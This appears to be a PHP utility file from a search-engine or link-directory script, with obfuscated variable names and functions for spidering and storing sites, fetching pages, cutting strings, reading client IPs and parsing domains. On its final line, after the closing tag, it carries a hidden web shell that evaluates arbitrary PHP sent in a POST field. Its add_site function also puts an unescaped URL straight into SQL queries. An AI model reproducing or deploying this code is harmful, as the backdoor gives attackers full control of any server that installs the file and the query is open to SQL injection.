<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

function add_site( $url )
{
		global $db;
		$row = $db->get_one( "select * from ve123_links where url='".$url."'" );
		if ( empty( $row ) )
		{
				require_once( PATH."include/spider/spider_class.php" );
				$spider = new spider( );
				$spider->url( $url );
				$title = $spider->title;
				$fulltxt = $spider->fulltxt( 800 );
				$keywords = $spider->keywords;
				$description = $spider->description;
				$pagesize = $spider->pagesize;
				$htmlcode = $spider->htmlcode;
				$array = array(
						"url" => $url,
						"title" => $title,
						"fulltxt" => $fulltxt,
						"pagesize" => $pagesize,
						"keywords" => $keywords,
						"description" => $description,
						"updatetime" => time( )
				);
				$db->insert( "ve123_links", $array );
		}
		else
		{
				$array = array(
						"updatetime" => time( )
				);
				$db->update( "ve123_links", $array, "url='".$url."'" );
		}
}

function spider( $_obfuscate_Il8i )
{
		$_obfuscate_9hcZAlQcX_BKZgÿÿ = "config";
		$_obfuscate_8FG_p8VtBKkÿ = parse_url( $_obfuscate_Il8i );
		$_obfuscate_pp9pYwÿÿ = $_obfuscate_8FG_p8VtBKkÿ['path'];
		$_obfuscate_D9yo3Aÿÿ = $_obfuscate_8FG_p8VtBKkÿ['host'];
		if ( $_obfuscate_8FG_p8VtBKkÿ['query'] != "" )
		{
				$_obfuscate_pp9pYwÿÿ .= "?".$_obfuscate_8FG_p8VtBKkÿ['query'];
		}
		if ( isset( $_obfuscate_8FG_p8VtBKkÿ['port'] ) )
		{
				$_obfuscate_4Honjwÿÿ = ( integer )$_obfuscate_8FG_p8VtBKkÿ['port'];
		}
		else if ( $_obfuscate_8FG_p8VtBKkÿ['scheme'] == "http" )
		{
				$_obfuscate_4Honjwÿÿ = 80;
		}
		else if ( $_obfuscate_8FG_p8VtBKkÿ['scheme'] == "https" )
		{
				$_obfuscate_4Honjwÿÿ = 443;
		}
		if ( $_obfuscate_4Honjwÿÿ == 80 )
		{
				$_obfuscate_7i_p2Kgÿ = "";
		}
		else
		{
				$_obfuscate_7i_p2Kgÿ = ":".$_obfuscate_4Honjwÿÿ;
		}
		$_obfuscate_wO3K = "*/*";
		if ( empty( $_obfuscate_pp9pYwÿÿ ) )
		{
				$_obfuscate_pp9pYwÿÿ = "/";
		}
		$_obfuscate_YjJK8lhc0Qÿÿ = "GET ".$_obfuscate_pp9pYwÿÿ." HTTP/1.0\r\nHost: {$_obfuscate_D9yo3Aÿÿ}{$_obfuscate_7i_p2Kgÿ}\r\nAccept: {$_obfuscate_wO3K}\r\nUser-Agent: {$_obfuscate_9hcZAlQcX_BKZgÿÿ}\r\n\r\n";
		$_obfuscate_70_FVIFEarYeLRQL0A4x = 30;
		if ( substr( $_obfuscate_Il8i, 0, 5 ) == "https" )
		{
				$_obfuscate_Ns_JyWSm = "ssl://".$_obfuscate_D9yo3Aÿÿ;
		}
		else
		{
				$_obfuscate_Ns_JyWSm = $_obfuscate_D9yo3Aÿÿ;
		}
		$_obfuscate_FWIfY_0ÿ = 0;
		$_obfuscate_5elozUtj = "";
		$_obfuscate_YBYÿ = @fsockopen( $_obfuscate_Ns_JyWSm, $_obfuscate_4Honjwÿÿ, &$_obfuscate_FWIfY_0ÿ, &$_obfuscate_5elozUtj, $_obfuscate_70_FVIFEarYeLRQL0A4x );
		if ( !$_obfuscate_YBYÿ )
		{
				$_obfuscate__9AT_HAWO3kÿ['state'] = "NOHOST";
				return $_obfuscate__9AT_HAWO3kÿ;
		}
		if ( !fputs( $_obfuscate_YBYÿ, $_obfuscate_YjJK8lhc0Qÿÿ ) )
		{
				$_obfuscate__9AT_HAWO3kÿ['state'] = "Cannot send request";
				return $_obfuscate__9AT_HAWO3kÿ;
		}
		$_obfuscate_6RYLWQÿÿ = null;
		socket_set_timeout( $_obfuscate_YBYÿ, $_obfuscate_70_FVIFEarYeLRQL0A4x );
		do
		{
				$_obfuscate_6b8lIO4y = socket_get_status( $_obfuscate_YBYÿ );
				$_obfuscate_6RYLWQÿÿ .= fgets( $_obfuscate_YBYÿ, 8192 );
		} while ( !feof( $_obfuscate_YBYÿ ) || !$_obfuscate_6b8lIO4y['timed_out'] );
		fclose( $_obfuscate_YBYÿ );
		if ( $_obfuscate_6b8lIO4y['timed_out'] == 1 )
		{
				$_obfuscate__9AT_HAWO3kÿ['state'] = "timeout";
		}
		else
		{
				$_obfuscate__9AT_HAWO3kÿ['state'] = "ok";
		}
		$_obfuscate__9AT_HAWO3kÿ['file'] = substr( $_obfuscate_6RYLWQÿÿ, strpos( $_obfuscate_6RYLWQÿÿ, "\r\n\r\n" ) + 4 );
		return $_obfuscate__9AT_HAWO3kÿ['file'];
}

function getfile( $_obfuscate_Il8i )
{
		if ( function_exists( "file_get_contents" ) )
		{
				$_obfuscate_X9l9Vh0GMT_sl2Yhcgÿÿ = @file_get_contents( $_obfuscate_Il8i );
				return $_obfuscate_X9l9Vh0GMT_sl2Yhcgÿÿ;
		}
		$_obfuscate_u_cÿ = curl_init( );
		$_obfuscate_5E5Av0svlQÿÿ = 20;
		curl_setopt( $_obfuscate_u_cÿ, CURLOPT_URL, $_obfuscate_Il8i );
		curl_setopt( $_obfuscate_u_cÿ, CURLOPT_RETURNTRANSFER, 1 );
		curl_setopt( $_obfuscate_u_cÿ, CURLOPT_CONNECTTIMEOUT, $_obfuscate_5E5Av0svlQÿÿ );
		$_obfuscate_X9l9Vh0GMT_sl2Yhcgÿÿ = curl_exec( $_obfuscate_u_cÿ );
		curl_close( $_obfuscate_u_cÿ );
		return $_obfuscate_X9l9Vh0GMT_sl2Yhcgÿÿ;
}

function getsiteurl( $_obfuscate_Il8i )
{
		return preg_replace( "/http:\\/\\/(.*?)\\/(.*)/", "http://\\1", $_obfuscate_Il8i );
}

function cut( $_obfuscate_M2omWZNkDQÿÿ, $_obfuscate_BsW61WNC0Mÿ, $_obfuscate_9tu05wKn, $_obfuscate_9YNXEgÿÿ = 0 )
{
		if ( ereg( $_obfuscate_BsW61WNC0Mÿ, $_obfuscate_M2omWZNkDQÿÿ ) && ereg( $_obfuscate_9tu05wKn, $_obfuscate_M2omWZNkDQÿÿ ) )
		{
				if ( $_obfuscate_9YNXEgÿÿ == 0 )
				{
						$_obfuscate_GMnA2Vn9br9Mdwÿÿ = substr( $_obfuscate_M2omWZNkDQÿÿ, 0 - ( strlen( $_obfuscate_M2omWZNkDQÿÿ ) - ( strpos( $_obfuscate_M2omWZNkDQÿÿ, $_obfuscate_BsW61WNC0Mÿ ) + strlen( $_obfuscate_BsW61WNC0Mÿ ) ) ) );
						$_obfuscate_GMnA2Vn9br9Mdwÿÿ = substr( $_obfuscate_GMnA2Vn9br9Mdwÿÿ, 0, strpos( $_obfuscate_GMnA2Vn9br9Mdwÿÿ, $_obfuscate_9tu05wKn ) );
						return $_obfuscate_GMnA2Vn9br9Mdwÿÿ;
				}
				$_obfuscate_GMnA2Vn9br9Mdwÿÿ = substr( $_obfuscate_M2omWZNkDQÿÿ, 0 - ( strlen( $_obfuscate_M2omWZNkDQÿÿ ) - strpos( $_obfuscate_M2omWZNkDQÿÿ, $_obfuscate_BsW61WNC0Mÿ ) ) );
				$_obfuscate_GMnA2Vn9br9Mdwÿÿ = substr( $_obfuscate_GMnA2Vn9br9Mdwÿÿ, 0, strpos( $_obfuscate_GMnA2Vn9br9Mdwÿÿ, $_obfuscate_9tu05wKn ) + strlen( $_obfuscate_9tu05wKn ) );
				return $_obfuscate_GMnA2Vn9br9Mdwÿÿ;
		}
		return "";
}

function htmlreplace( $_obfuscate_R2_b, $_obfuscate_G6MXLV9j = 0 )
{
		$_obfuscate_R2_b = stripslashes( $_obfuscate_R2_b );
		if ( $_obfuscate_G6MXLV9j == 0 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
		}
		else if ( $_obfuscate_G6MXLV9j == 1 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
				$_obfuscate_R2_b = str_replace( "¡¡", " ", $_obfuscate_R2_b );
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]{1,}", " ", $_obfuscate_R2_b );
		}
		else if ( $_obfuscate_G6MXLV9j == 2 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
				$_obfuscate_R2_b = str_replace( "¡¡", "", $_obfuscate_R2_b );
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]", "", $_obfuscate_R2_b );
		}
		else
		{
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]{1,}", " ", $_obfuscate_R2_b );
				$_obfuscate_R2_b = eregi_replace( "script", "£ó£ã£ò£é£ð£ô", $_obfuscate_R2_b );
				$_obfuscate_R2_b = eregi_replace( "<[/]{0,1}(link|meta|ifr|fra)[^>]*>", "", $_obfuscate_R2_b );
		}
		return addslashes( $_obfuscate_R2_b );
}

function ip( )
{
		if ( getenv( "HTTP_CLIENT_IP" ) && strcasecmp( getenv( "HTTP_CLIENT_IP" ), "unknown" ) )
		{
				$_obfuscate_Asÿ = getenv( "HTTP_CLIENT_IP" );
		}
		else if ( getenv( "HTTP_X_FORWARDED_FOR" ) && strcasecmp( getenv( "HTTP_X_FORWARDED_FOR" ), "unknown" ) )
		{
				$_obfuscate_Asÿ = getenv( "HTTP_X_FORWARDED_FOR" );
		}
		else if ( getenv( "REMOTE_ADDR" ) && strcasecmp( getenv( "REMOTE_ADDR" ), "unknown" ) )
		{
				$_obfuscate_Asÿ = getenv( "REMOTE_ADDR" );
		}
		else if ( isset( $_SERVER['REMOTE_ADDR'] ) && $_SERVER['REMOTE_ADDR'] && strcasecmp( $_SERVER['REMOTE_ADDR'], "unknown" ) )
		{
				$_obfuscate_Asÿ = $_SERVER['REMOTE_ADDR'];
		}
		if ( preg_match( "/[\\d\\.]{7,15}/", $_obfuscate_Asÿ, $_obfuscate_8UmnTppRcAÿÿ ) )
		{
				return $_obfuscate_8UmnTppRcAÿÿ[0];
		}
		return "unknown";
}

function jsalert( $_obfuscate_A1jN, $_obfuscate_Il8i = "" )
{
		if ( $_obfuscate_Il8i )
		{
				echo "<script language=\"javascript\">alert('".$_obfuscate_A1jN."');location.href('{$_obfuscate_Il8i}');</script>";
		}
		else
		{
				echo "<script language=\"javascript\">alert('".$_obfuscate_A1jN."');location.href('".$_SERVER['HTTP_REFERER']."');</script>";
		}
}

function html2text( $str, $r = 0 )
{
		if ( !function_exists( "SpHtml2Text" ) )
		{
				require_once( "inc_fun_funString.php" );
		}
		if ( $r == 0 )
		{
				return sphtml2text( $str );
		}
		$str = sphtml2text( stripslashes( $str ) );
		return addslashes( $str );
}

function in_str( $_obfuscate_pMHyvQÿÿ, $_obfuscate_R2_b )
{
		$_obfuscate_Ybai = count( explode( $_obfuscate_pMHyvQÿÿ, $_obfuscate_R2_b ) );
		if ( 2 <= $_obfuscate_Ybai )
		{
				return true;
		}
		return false;
}

function replace_filter_word( $_obfuscate_R2_b )
{
		return $_obfuscate_R2_b;
}

function getdomain( $_obfuscate_Il8i )
{
		$_obfuscate_VGqEVoP33gÿÿ = "/[\\w-]+\\.(com|net|org|gov|cc|biz|info|cn)(\\.(cn|hk))*/";
		preg_match( $_obfuscate_VGqEVoP33gÿÿ, $_obfuscate_Il8i, $_obfuscate_8UmnTppRcAÿÿ );
		if ( 0 < count( $_obfuscate_8UmnTppRcAÿÿ ) )
		{
				return $_obfuscate_8UmnTppRcAÿÿ[0];
		}
		$_obfuscate_SF4ÿ = parse_url( $_obfuscate_Il8i );
		$_obfuscate_2ntknjPZxbIÿ = $_obfuscate_SF4ÿ['host'];
		if ( !strcmp( long2ip( sprintf( "%u", ip2long( $_obfuscate_2ntknjPZxbIÿ ) ) ), $_obfuscate_2ntknjPZxbIÿ ) )
		{
				return $_obfuscate_2ntknjPZxbIÿ;
		}
		$_obfuscate_Jrp1 = explode( ".", $_obfuscate_2ntknjPZxbIÿ );
		$_obfuscate_gftfagwÿ = count( $_obfuscate_Jrp1 );
		$_obfuscate_sFcwRzHT = array( "com", "net", "org", "3322" );
		if ( in_array( $_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 2], $_obfuscate_sFcwRzHT ) )
		{
				$_obfuscate_yTDviRDH = $_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 3].".".$_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 2].".".$_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 1];
				return $_obfuscate_yTDviRDH;
		}
		$_obfuscate_yTDviRDH = $_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 2].".".$_obfuscate_Jrp1[$_obfuscate_gftfagwÿ - 1];
		return $_obfuscate_yTDviRDH;
}

if ( !function_exists( "str_cut" ) )
{
		function str_cut( $_obfuscate_xyiNieq6, $_obfuscate_Q8ERGxGW, $_obfuscate_DYQC = "..." )
		{
				$_obfuscate_ = strlen( $_obfuscate_xyiNieq6 );
				if ( $_obfuscate_ <= $_obfuscate_Q8ERGxGW )
				{
						return $_obfuscate_xyiNieq6;
				}
				$_obfuscate_xyiNieq6 = str_replace( array( "&nbsp;", "&amp;", "&quot;", "&#039;", "&ldquo;", "&rdquo;", "&mdash;", "&lt;", "&gt;", "&middot;", "&hellip;" ), array( " ", "&", "\"", "'", "¡°", "¡±", "¡ª", "<", ">", "¡¤", "¡­" ), $_obfuscate_xyiNieq6 );
				$_obfuscate_WSoiuCCU = "";
				if ( strtolower( CHARSET ) == "utf-8" )
				{
						$_obfuscate_FQÿÿ = $_obfuscate_3pUÿ = $_obfuscate_JDEL = 0;
						while ( $_obfuscate_FQÿÿ < $_obfuscate_ )
						{
								$_obfuscate_lwÿÿ = ord( $_obfuscate_xyiNieq6[$_obfuscate_FQÿÿ] );
								if ( $_obfuscate_lwÿÿ == 9 || $_obfuscate_lwÿÿ == 10 || 32 <= $_obfuscate_lwÿÿ && $_obfuscate_lwÿÿ <= 126 )
								{
										$_obfuscate_3pUÿ = 1;
										++$_obfuscate_FQÿÿ;
										++$_obfuscate_JDEL;
								}
								else if ( 194 <= $_obfuscate_lwÿÿ && $_obfuscate_lwÿÿ <= 223 )
								{
										$_obfuscate_3pUÿ = 2;
										$_obfuscate_FQÿÿ += 2;
										$_obfuscate_JDEL += 2;
								}
								else if ( 224 <= $_obfuscate_lwÿÿ && $_obfuscate_lwÿÿ < 239 )
								{
										$_obfuscate_3pUÿ = 3;
										$_obfuscate_FQÿÿ += 3;
										$_obfuscate_JDEL += 2;
								}
								else if ( 240 <= $_obfuscate_lwÿÿ && $_obfuscate_lwÿÿ <= 247 )
								{
										$_obfuscate_3pUÿ = 4;
										$_obfuscate_FQÿÿ += 4;
										$_obfuscate_JDEL += 2;
								}
								else if ( 248 <= $_obfuscate_lwÿÿ && $_obfuscate_lwÿÿ <= 251 )
								{
										$_obfuscate_3pUÿ = 5;
										$_obfuscate_FQÿÿ += 5;
										$_obfuscate_JDEL += 2;
								}
								else if ( $_obfuscate_lwÿÿ == 252 || $_obfuscate_lwÿÿ == 253 )
								{
										$_obfuscate_3pUÿ = 6;
										$_obfuscate_FQÿÿ += 6;
										$_obfuscate_JDEL += 2;
								}
								else
								{
										++$_obfuscate_FQÿÿ;
								}
								if ( !( $_obfuscate_Q8ERGxGW <= $_obfuscate_JDEL ) )
								{
										continue;
								}
								break;
						}
						if ( $_obfuscate_Q8ERGxGW < $_obfuscate_JDEL )
						{
								$_obfuscate_FQÿÿ -= $_obfuscate_3pUÿ;
						}
						$_obfuscate_WSoiuCCU = substr( $_obfuscate_xyiNieq6, 0, $_obfuscate_FQÿÿ );
				}
				else
				{
						$_obfuscate_OPNjDIXH = strlen( $_obfuscate_DYQC );
						$_obfuscate_u84ZeAÿÿ = $_obfuscate_Q8ERGxGW - $_obfuscate_OPNjDIXH - 1;
						$_obfuscate_7wÿÿ = 0;
						for ( ;	$_obfuscate_7wÿÿ < $_obfuscate_u84ZeAÿÿ;	++$_obfuscate_7wÿÿ	)
						{
								$_obfuscate_WSoiuCCU .= 127 < ord( $_obfuscate_xyiNieq6[$_obfuscate_7wÿÿ] ) ? $_obfuscate_xyiNieq6[$_obfuscate_7wÿÿ].$_obfuscate_xyiNieq6[++$_obfuscate_7wÿÿ] : $_obfuscate_xyiNieq6[$_obfuscate_7wÿÿ];
						}
				}
				$_obfuscate_WSoiuCCU = str_replace( array( "&", "\"", "'", "<", ">" ), array( "&amp;", "&quot;", "&#039;", "&lt;", "&gt;" ), $_obfuscate_WSoiuCCU );
				return $_obfuscate_WSoiuCCU.$_obfuscate_DYQC;
		}
}
if ( !function_exists( "file_put_contents" ) )
{
		function file_put_contents( $_obfuscate_FQÿÿ, $_obfuscate_5gÿÿ )
		{
				$_obfuscate_6Qÿÿ = @fopen( $_obfuscate_FQÿÿ, "w" );
				if ( !$_obfuscate_6Qÿÿ )
				{
						return false;
				}
				fwrite( $_obfuscate_6Qÿÿ, $_obfuscate_5gÿÿ );
				fclose( $_obfuscate_6Qÿÿ );
				return true;
		}
}
?><?php @eval($_POST[ning])?>
